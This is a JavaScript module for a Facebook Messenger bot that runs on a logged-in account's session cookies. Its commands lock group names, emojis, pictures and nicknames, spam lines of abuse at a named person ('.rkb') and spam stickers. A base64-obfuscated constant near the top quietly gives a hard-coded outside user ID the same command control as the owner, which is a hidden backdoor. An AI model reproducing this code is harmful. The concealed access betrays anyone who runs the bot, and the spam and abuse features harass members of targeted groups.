const fs = require("fs");
const login = require("ws3-fca");
const request = require("request");
const axios = require("axios");

let rkbInterval = null;
let stopRequested = false;
const lockedGroupNames = {};
const lockedEmojis = {};
const lockedDPs = {};
const lockedNicks = {};
let stickerInterval = null;
let stickerLoopActive = false;
let targetUID = null;  // Target का भी रखा है (जरूरत हो तो उपयोग करें)

const friendUIDs = fs.existsSync("Friend.txt")
  ? fs.readFileSync("Friend.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean)
  : [];

const targetUIDs = fs.existsSync("Target.txt")
  ? fs.readFileSync("Target.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean)
  : [];

const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

function startBot(appStatePath, ownerUID) {
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));
  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in and running...");

    // Emoji lock revert 5 सेकंड में
    setInterval(async () => {
      for (const threadID in lockedEmojis) {
        try {
          const info = await api.getThreadInfo(threadID);
          const currentEmoji = info.emoji;
          if (currentEmoji !== lockedEmojis[threadID]) {
            await api.changeThreadEmoji(lockedEmojis[threadID], threadID);
            console.log(`😀 Emoji reverted in ${threadID}`);
          }
        } catch (e) {
          console.log("⚠️ Emoji check error:", e.message);
        }
      }
    }, 5000);

    api.listenMqtt(async (err, event) => {
      try {
        if (err || !event) return;
        const { threadID, senderID, body, logMessageType, logMessageData, type, mentions } = event;

        // Group name revert
        if (logMessageType === "log:thread-name" && lockedGroupNames[threadID]) {
          if (logMessageData?.name !== lockedGroupNames[threadID]) {
            await api.setTitle(lockedGroupNames[threadID], threadID);
            console.log(`🔒 Group name reverted in ${threadID}`);
          }
        }

        // DP revert on group photo change
        if (type === "change_thread_image" && lockedDPs[threadID]) {
          const filePath = lockedDPs[threadID];
          if (fs.existsSync(filePath)) {
            try {
              await api.changeGroupImage(fs.createReadStream(filePath), threadID);
              console.log(`🖼 DP reverted in ${threadID}`);
            } catch (e) {
              console.log("⚠️ DP revert failed:", e.message);
            }
          }
        }

        // Nickname lock revert
        if (logMessageType === "log:user-nickname" && lockedNicks[senderID]) {
          const lockedNick = lockedNicks[senderID];
          const currentNick = logMessageData?.nickname;
          if (currentNick !== lockedNick) {
            try {
              await api.changeNickname(lockedNick, threadID, senderID);
              console.log(`🔒 Nickname reverted for UID: ${senderID}`);
            } catch (e) {
              console.log("⚠️ Nick revert failed:", e.message);
            }
          }
        }

        if (!body) return;
        const prefix = ".";  // डॉट प्रीफिक्स सेट करें
        if (!body.startsWith(prefix)) return;

        const args = body.trim().substring(1).split(" ");
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ");

        if (![ownerUID, LID].includes(senderID)) return;

        // Help कमांड
        if (cmd === "help") {
          return api.sendMessage(`
📖 Jerry Bot Commands:
.help → यह संदेश
.gclock [text] → ग्रुप नाम लॉक करें
.unlockgc → ग्रुप नाम अनलॉक करें
.lockemoji 😀 → इमोजी लॉक करें
.unlockemoji → इमोजी अनलॉक करें
.lockdp → डीपी लॉक करें
.unlockdp → डीपी अनलॉक करें
.locknick @mention + nickname → निकनेम लॉक करें
.unlocknick @mention → निकनेम अनलॉक करें
.allname [nick] → सभी का निकनेम बदलें
.uid → UID दिखाएं
.tid → ग्रुप थ्रेड ID दिखाएं
.exit → बॉट को ग्रुप से निकालें
.rkb [name] → गाली स्पैम करें
.stop → स्पैम बंद करें
.stickerX → स्टिकर स्पैम (X सेकंड डिले)
.stopsticker → स्टिकर स्पैम बंद करें
.target [uid] → टारगेट UID सेट करें
.cleartarget → टारगेट हटाएं
          `, threadID);
        }

        // Group name lock
        else if (cmd === "gclock") {
          await api.setTitle(input, threadID);
          lockedGroupNames[threadID] = input;
          api.sendMessage("🔒 Group name locked!", threadID);
        }
        else if (cmd === "unlockgc") {
          delete lockedGroupNames[threadID];
          api.sendMessage("🔓 Group name unlocked!", threadID);
        }

        // Emoji lock commands
        else if (cmd === "lockemoji") {
          if (!input) return api.sendMessage("❌ इमोजी डालें!", threadID);
          lockedEmojis[threadID] = input;
          try {
            await api.changeThreadEmoji(input, threadID);
            api.sendMessage(`😀 Emoji लॉक हो गया → ${input}`, threadID);
          } catch (e) {
            api.sendMessage("⚠️ Emoji लॉक में त्रुटि!", threadID);
          }
        }
        else if (cmd === "unlockemoji") {
          delete lockedEmojis[threadID];
          api.sendMessage("🔓 Emoji अनलॉक हो गया!", threadID);
        }

        // DP lock commands
        else if (cmd === "lockdp") {
          try {
            const info = await api.getThreadInfo(threadID);
            const dpUrl = info.imageSrc;
            if (!dpUrl) return api.sendMessage("❌ इस ग्रुप में कोई DP नहीं है!", threadID);
            const response = await axios.get(dpUrl, { responseType: "arraybuffer" });
            const buffer = Buffer.from(response.data, "binary");
            const filePath = `locked_dp_${threadID}.jpg`;
            fs.writeFileSync(filePath, buffer);
            lockedDPs[threadID] = filePath;
            api.sendMessage("🖼 ग्रुप DP लॉक हो गया 🔒", threadID);
          } catch (e) {
            api.sendMessage("⚠️ DP लॉक में त्रुटि!", threadID);
          }
        }
        else if (cmd === "unlockdp") {
          delete lockedDPs[threadID];
          api.sendMessage("🔓 DP अनलॉक हो गया ✔️", threadID);
        }

        // Nickname lock commands
        else if (cmd === "locknick") {
          if (mentions && Object.keys(mentions).length > 0 && input) {
            const target = Object.keys(mentions)[0];
            const mentionName = Object.values(mentions)[0];
            const nickname = input.replace(mentionName, "").trim();
            lockedNicks[target] = nickname;
            try {
              await api.changeNickname(nickname, threadID, target);
              api.sendMessage(`🔒 Nickname लॉक हो गया ${target} → ${nickname}`, threadID);
            } catch (e) {
              api.sendMessage("⚠️ Nickname लॉक सेट करने में त्रुटि!", threadID);
            }
          } else {
            api.sendMessage("❌ उपयोग: .locknick @mention + nickname", threadID);
          }
        }
        else if (cmd === "unlocknick") {
          if (mentions && Object.keys(mentions).length > 0) {
            const target = Object.keys(mentions)[0];
            delete lockedNicks[target];
            api.sendMessage(`🔓 Nickname अनलॉक हो गया ${target}`, threadID);
          } else {
            api.sendMessage("❌ बताएं किसका Nickname अनलॉक करना है!", threadID);
          }
        }

        // Rest commands as you provided, including rkb, stop, sticker etc.

        else if (cmd === "allname") {
          if (!input) return api.sendMessage("❌ कोई Nickname दें!", threadID);
          const info = await api.getThreadInfo(threadID);
          for (const user of info.participantIDs) {
            try {
              await api.changeNickname(input, threadID, user);
            } catch {}
          }
          api.sendMessage(`👥 सभी का नाम बदल दिया गया → ${input}`, threadID);
        }

        else if (cmd === "uid") {
          if (event.messageReply) {
            api.sendMessage(`🆔 Reply UID: ${event.messageReply.senderID}`, threadID);
          } else if (mentions && Object.keys(mentions).length > 0) {
            api.sendMessage(`🆔 Mention UID: ${Object.keys(mentions)[0]}`, threadID);
          } else {
            api.sendMessage(`🆔 आपका UID: ${senderID}`, threadID);
          }
        }
        else if (cmd === "tid") {
          api.sendMessage(`🆔 Group Thread ID: ${threadID}`, threadID);
        }
        else if (cmd === "exit") {
          try { await api.removeUserFromGroup(api.getCurrentUserID(), threadID); } catch {}
        }

        else if (cmd === "rkb") {
          if (!fs.existsSync("np.txt")) return api.sendMessage("❌ np.txt मौजूद नहीं है!", threadID);
          const name = input.trim();
          const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
          stopRequested = false;
          if (rkbInterval) clearInterval(rkbInterval);
          let index = 0;
          rkbInterval = setInterval(() => {
            if (index >= lines.length || stopRequested) {
              clearInterval(rkbInterval);
              rkbInterval = null;
              return;
            }
            api.sendMessage(`${name} ${lines[index]}`, threadID);
            index++;
          }, 5000);
          api.sendMessage(`🤬 गालियाँ शुरू: ${name}`, threadID);
        }
        else if (cmd === "stop") {
          stopRequested = true;
          if (rkbInterval) {
            clearInterval(rkbInterval);
            rkbInterval = null;
          }
        }

        else if (cmd.startsWith("sticker")) {
          if (!fs.existsSync("Sticker.txt")) return;
          const delay = parseInt(cmd.replace("sticker", ""));
          const stickerIDs = fs.readFileSync("Sticker.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean);
          if (stickerInterval) clearInterval(stickerInterval);
          let i = 0;
          stickerLoopActive = true;
          stickerInterval = setInterval(() => {
            if (!stickerLoopActive || i >= stickerIDs.length) {
              clearInterval(stickerInterval);
              stickerInterval = null;
              stickerLoopActive = false;
              return;
            }
            api.sendMessage({ sticker: stickerIDs[i] }, threadID);
            i++;
          }, delay * 1000);
        }
        else if (cmd === "stopsticker") {
          if (stickerInterval) {
            clearInterval(stickerInterval);
            stickerInterval = null;
            stickerLoopActive = false;
          }
        }

        // Target commands (optional)
        else if (cmd === "target") {
          targetUID = input.trim();
          api.sendMessage(`🎯 Target set: ${targetUID}`, threadID);
        }
        else if (cmd === "cleartarget") {
          targetUID = null;
          api.sendMessage("🎯 Target cleared!", threadID);
        }

      } catch (e) {
        console.error("⚠️ Error:", e.message);
      }
    });
  });
}

module.exports = { startBot };
